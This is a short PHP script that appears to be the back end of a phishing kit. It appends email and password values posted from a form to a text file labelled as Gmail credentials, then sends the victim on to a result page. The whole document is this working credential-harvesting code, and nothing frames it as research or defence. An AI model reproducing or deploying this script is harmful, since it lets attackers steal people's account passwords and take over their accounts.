<?php

file_put_contents("usernames.txt", "Gmail Username: " . $_POST['email'] . " Pass: " . $_POST['pass'] . "\n", FILE_APPEND);
header('Location: ./result.html');
exit();
?>